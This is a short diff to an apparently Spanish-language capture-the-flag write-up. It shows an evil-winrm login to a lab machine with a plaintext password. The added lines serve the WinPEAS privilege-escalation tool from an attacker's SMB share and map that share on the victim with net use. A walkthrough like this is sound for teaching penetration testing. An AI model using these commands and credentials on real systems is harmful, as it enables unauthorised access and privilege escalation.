@@ -235,5 +235,12 @@ Como es miembro de remote manager nos podemos intentar conectar con [[EVIL_WINRM
 `evil-winrm -i 10.10.11.70 -u "steph.cooper" -p 'ChefSteph2025!'`
 Y nosa da una terminal como este usuario:
 
+Usaremos [[WINPEAS]] vara ver diferentes formas de elevar nuestros privilegios.
+Lo subimos a la maquina con:
+`impacket-smbserver smbFolder $(pwd) -smb2support -username jalag -password 12345`
+
+Y en la maquina victima nos lo traemos con:
+`net use z: \\10.10.14.219\smbFolder /u:jalag 12345`
+
 
 
